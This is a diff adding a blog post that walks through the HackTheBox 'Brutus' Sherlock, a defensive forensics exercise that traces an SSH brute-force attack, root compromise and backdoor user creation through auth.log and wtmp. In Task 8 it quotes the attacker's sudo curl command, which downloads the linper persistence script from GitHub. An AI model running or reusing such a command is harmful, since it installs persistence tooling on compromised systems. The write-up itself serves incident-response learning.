@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="generator" content="Asciidoctor 2.0.23">
+        <title>The Beginning</title>
+    </head>
+    <body class="article">
+        <div id="header">
+        </div>
+        <div id="content">
+            <div class="paragraph">
+                <p>Here’s my first writeup of 2026! I wanted to get a jump on starting to
+                work my way though the HTB Sherlocks, since I’ve never done them before,
+                and (almost) any experience is good experience.</p>
+            </div>
+            <div class="sect1">
+                <h2 id="_the_beginning">The Beginning</h2>
+                <div class="sectionbody">
+                    <div class="paragraph">
+                        <p>On the webpage for the Sherlock I was presented with a password
+                        protected <code>.zip</code> archive and 8 tasks to complete.</p>
+                    </div>
+                    <div class="paragraph">
+                        <div class="title">brutus home page</div>
+                        <p>image::/blog/posts/media/brutus-sherlock-writeup/overview.png[brutus
+                        home page]</p>
+                    </div>
+                    <div class="paragraph">
+                        <p>After downloading the file, I went to extract it, but was faced with an
+                        interesting error:</p>
+                    </div>
+                    <div class="paragraph">
+                        <div class="title">archive failed extraction</div>
+                        <p>image::/blog/posts/media/brutus-sherlock-writeup/bad-extract.png[archive
+                        failed extraction]</p>
+                    </div>
+                    <div class="paragraph">
+                        <p>A quick Google search tells me that the error
+                        <code>unsupported compression method 99</code> means that the regular unix
+                        <code>unzip</code> binary isn’t able to extract those files due to the
+                        compression method used. What I can do, however; is use <code>7z</code> since it
+                        supports those compression methods.</p>
+                    </div>
+                    <div class="paragraph">
+                        <div class="title">archive correct extraction</div>
+                        <p>image::/blog/posts/media/brutus-sherlock-writeup/good-extract.png[archive
+                        correct extraction]</p>
+                    </div>
+                    <div class="paragraph">
+                        <p>After inputting the password, I saw that 3 files were extracted:
+                        <code>auth.log</code>, <code>utmp.py</code>, and <code>wtmp</code></p>
+                    </div>
+                </div>
+            </div>
+            <div class="sect1">
+                <h2 id="_the_tasks_begin">The tasks begin</h2>
+                <div class="sectionbody">
+                    <div class="sect2">
+                        <h3 id="_task_1">Task 1</h3>
+                        <div class="paragraph">
+                            <p>The first task is to: &#8220;Analyze the <code>auth.log</code>. What is the IP address
+                            used by the attacker to carry out a brute force attack?&#8221;</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>I started by opening the file in <code>vim</code> where I can see a log of all
+                            the authentication attempts from <code>pam_unix</code>. For the first little bit,
+                            the traffic seems normal with authentication over <code>SSH</code> to a user
+                            named <code>confluence</code>. But, at line 68 there’s something new: &#8220;Invalid
+                            user admin from 65.2.161.68 port 46380&#8221;. These types of messages keep
+                            coming through from the same IP address, across a number of different
+                            usernames. It looks like this is the attacker making their brute force
+                            attack.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">brute force attempts</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/brute-force-attempts.png[brute
+                            force attempts]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>After inputting the IP address &#8220;65.2.161.68&#8221; to the prompt for the
+                            task, I see that this is the correct IP address.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 1 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-1.png[task 1
+                            complete]</p>
+                        </div>
+                    </div>
+                    <div class="sect2">
+                        <h3 id="_task_2">Task 2</h3>
+                        <div class="paragraph">
+                            <p>The second task is: &#8220;The bruteforce attempts were successful and
+                            attacker gained access to an account on the server. What is the username
+                            of the account?&#8221;</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>Looking deeper into the <code>auth.log</code> on line 281 I saw &#8220;Accepted
+                            password for root from 65.2.161.68&#8221;. Clearly the attacker has gotten
+                            control of the root account. Just a little bit later I see the lines
+                            &#8220;session opened for user root(uid=0) by (uid=0)&#8221; and &#8220;New session 34
+                            of user root.&#8221; This confirms that the attacker is using the root
+                            account.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">successful login as root</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/root-success.png[successful
+                            login as root]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>After inputting &#8220;root&#8221; into the prompt for the task, I get a
+                            confirmation this is the correct account.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 2 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-2.png[task 2
+                            complete]</p>
+                        </div>
+                    </div>
+                    <div class="sect2">
+                        <h3 id="_task_3">Task 3</h3>
+                        <div class="paragraph">
+                            <p>The third task is: &#8220;Identify the UTC timestamp when the attacker logged
+                            in manually to the server and established a terminal session to carry
+                            out their objectives. The login time will be differnt than the
+                            authentication time, and can be found in the wtmp artifact.&#8221;</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>This meant that I could no longer rely on the <code>auth.log</code>. One issue
+                            that I ran into was that when I attempted to open the file in <code>vim</code>, I
+                            quickly found out that this is a binary file. After double-checking by
+                            running the <code>file</code> command on the wtmp file, that confirmed the file
+                            is a data format, not ascii-text.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">wtmp filetype</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/wtmp-type.png[wtmp
+                            filetype]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>Once again, heading to Google gives an easier answer. This is a specific
+                            log file that can be read using the <code>utmpdump</code> command. After running
+                            the command on the file, all of the data got outputted to <code>stdout</code>, so
+                            I redirected the output to a file for easy viewing and manipulation.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">wtmp dump command</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/wtmp-dump.png[wtmp dump
+                            command]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>Taking a look at this file shows a few different events: reboot, login,
+                            runlevel, and sessions. From the <code>auth.log</code> file, I knew that the
+                            attack occured on March 6th 2024, and I knew that the root user was
+                            connected at around 06:32. Therefore, by checking the events inside the
+                            <code>wtmp-dump/dump</code> file that are around that time, I should see a login
+                            event for the root user.</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>Lo and behold, at the bottom of the file on line 27 is a login event for
+                            the root user from the attacker’s IP address on 2024-03-06 06:32:45</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">root user login time</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/login-time.png[root
+                            user login time]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>After inputting the time I found into the prompt for the task, I get a
+                            confirmation this is the login time.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 3 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-3.png[task 3
+                            complete]</p>
+                        </div>
+                    </div>
+                    <div class="sect2">
+                        <h3 id="_task_4">Task 4</h3>
+                        <div class="paragraph">
+                            <p>The fourth task is: “SSH login sessions are tracked and assigned a
+                            session number upon login. What is the session number assigned to the
+                            attacker’s session for the user account from Question 2?</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>I’ve seen the answer to this question before, on line 324 after the
+                            attacker logs in as root. Looking back to that I found that the SSH
+                            session number is 37.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">ssh session number</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/ssh-session.png[ssh
+                            session number]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>After dropping this into the prompt for the task I’m reassured that this
+                            is correct.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 4 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-4.png[task 4
+                            complete]</p>
+                        </div>
+                    </div>
+                    <div class="sect2">
+                        <h3 id="_task_5">Task 5</h3>
+                        <div class="paragraph">
+                            <p>The fifth task is: &#8220;The attacker added a new user as part of their
+                            persistence strategy on the server and gave this new user account higher
+                            privileges. What is the name of this account?&#8221;</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>Looking through <code>auth.log</code> I found an interesting chain of events.
+                            After the root user logged in over SSH, a new group was created, and
+                            after that, a new user was created. Then the new user was added to the
+                            <code>sudo</code> group, giving the user root access. The username for that user
+                            is cyberjunkie.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">new user added</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/new-user-added.png[new
+                            user added]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>After inputting that username into the prompt for the task, I see this
+                            was the correct username.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 5 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-5.png[task 5
+                            complete]</p>
+                        </div>
+                    </div>
+                    <div class="sect2">
+                        <h3 id="_task_6">Task 6</h3>
+                        <div class="paragraph">
+                            <p>The sixth task is: &#8220;What is the MITRE ATT&amp;CK sub-technique ID used for
+                            persistence by creating a new user account?&#8221;</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>I honestly didn’t know what this was, so I turned to Google for some
+                            much needed assistance. After poking around on the MITRE website and
+                            learning about how they define stuff, I found the ID T1136.001.</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>I dropped that in the prompt for the task, and got confirmation that was
+                            correct.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 6 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-6.png[task 6
+                            complete]</p>
+                        </div>
+                    </div>
+                    <div class="sect2">
+                        <h3 id="_task_7">Task 7</h3>
+                        <div class="paragraph">
+                            <p>The seventh task is: &#8220;What time did the attacker’s first SSH session
+                            end according to auth.log?&#8221;</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>This should be fairly simple to find. Diving back in to <code>auth.log</code> I’m
+                            looking for the word disconnect, so doing a simple search inside vim
+                            brings me to the exact line I’m looking for. There I see the timestamp
+                            of Mar 6 06:37:24</p>
+                        </div>
+                        <div class="imageblock">
+                            <div class="content">
+                                <img src="/blog/posts/media/brutus-sherlock-writeup/disconnect.png" alt="disconnect">
+                            </div>
+                            <div class="title">Figure 1. disconnect</div>
+                        </div>
+                        <div class="paragraph">
+                            <p>I put the timestamp 2024-03-06 06:37:24 into the prompt for the task,
+                            and confirmed this was the correct time.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 7 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-7.png[task 7
+                            complete]</p>
+                        </div>
+                    </div>
+                    <div class="sect2">
+                        <h3 id="_task_8">Task 8</h3>
+                        <div class="paragraph">
+                            <p>The eighth task is: &#8220;The attacker logged into their backdoor account
+                            and utilized their higher privileges to download a script. What is the
+                            full command executed using sudo?&#8221;</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>This last task is slightly more tricky than the other other tasks
+                            because there’s one command that’s thrown in there to throw you off, but
+                            the real command I’m looking for should be pretty obvious. Near the
+                            bottom of <code>auth.log</code> I see line that has <code>sudo</code> in it. Upon further
+                            inspection I see that this is the command being run: &#8220;/usr/bin/curl
+                            <a href="https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh&#8221" class="bare">https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh&#8221</a>;.
+                            Now, linper is a system persistence script, which makes compete sense to
+                            run on a compromised machine like this.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">linper download</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/linper.png[linper
+                            download]</p>
+                        </div>
+                        <div class="paragraph">
+                            <p>After dropping that command in the prompt for the task, I see that’s the
+                            command we’re looking for.</p>
+                        </div>
+                        <div class="paragraph">
+                            <div class="title">task 8 complete</div>
+                            <p>image::/blog/posts/media/brutus-sherlock-writeup/task-8.png[task 8
+                            complete]</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="sect1">
+                <h2 id="_the_end">The end</h2>
+                <div class="sectionbody">
+                    <div class="paragraph">
+                        <p>That’s the Sherlock complete! This honestly didn’t take me too long to
+                        complete, a super easy challenge. Maybe the next Sherlock I do, I’ll
+                        ramp up the difficulty on.</p>
+                    </div>
+                    <div class="paragraph">
+                        <p>Until next time</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="footer">
+            <div id="footer-text">
+                Last updated 2026-04-05 14:44:38 -0600
+            </div>
+        </div>
+    </body>
+</html>
